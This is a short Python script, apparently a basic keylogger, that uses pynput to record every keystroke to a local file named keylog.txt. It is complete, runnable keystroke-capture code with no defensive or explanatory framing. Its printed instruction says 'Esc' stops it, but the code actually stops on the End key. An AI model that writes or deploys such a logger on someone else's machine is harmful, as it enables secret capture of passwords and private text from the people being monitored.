from pynput import keyboard
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format='%(message)s')


def on_press(key):
    try:
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        logging.info(f"Special key pressed: {key}")


def on_release(key):
    if key == keyboard.Key.end:
        return False


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press 'Esc' to stop.")
    listener.join()
